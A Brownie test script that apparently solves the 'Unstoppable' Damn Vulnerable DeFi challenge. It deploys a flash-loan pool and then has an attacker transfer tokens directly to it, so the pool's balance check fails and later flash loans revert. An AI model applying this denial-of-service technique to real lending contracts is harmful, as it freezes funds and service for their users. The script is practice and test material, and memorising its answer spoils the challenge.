import pytest
from brownie import DamnValuableToken, UnstoppableLender, ReceiverUnstoppable, accounts, exceptions
TOKENS_IN_POOL = 1000000
INITIAL_ATTACKER_TOKEN_BALANCE = 100


def deploy():
    deployer, attacker, someuser = accounts[:3]

    token = DamnValuableToken.deploy({'from': deployer})
    pool = UnstoppableLender.deploy(token.address, {'from': deployer})

    token.approve(pool.address, TOKENS_IN_POOL, {'from': deployer})
    pool.depositTokens(TOKENS_IN_POOL, {'from': deployer})

    token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE, {
                   'from': deployer})

    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
    assert token.balanceOf(attacker.address) == INITIAL_ATTACKER_TOKEN_BALANCE

    receivercontract = ReceiverUnstoppable.deploy(
        pool.address, {'from': someuser})
    receivercontract.executeFlashLoan(10, {'from': someuser})

    return deployer, attacker, someuser, token, pool, receivercontract


def exploit(token, pool, attacker):
    token.transfer(pool.address, INITIAL_ATTACKER_TOKEN_BALANCE, {
        'from': attacker})


def after(receivercontract, someuser):
    with pytest.raises(exceptions.VirtualMachineError):
        tx = receivercontract.executeFlashLoan(10, {'from': someuser})
        assert bool(tx.status)


def main():
    deployer, attacker, someuser, token, pool, receivercontract = deploy()

    exploit(token, pool, attacker)

    after(receivercontract, someuser)
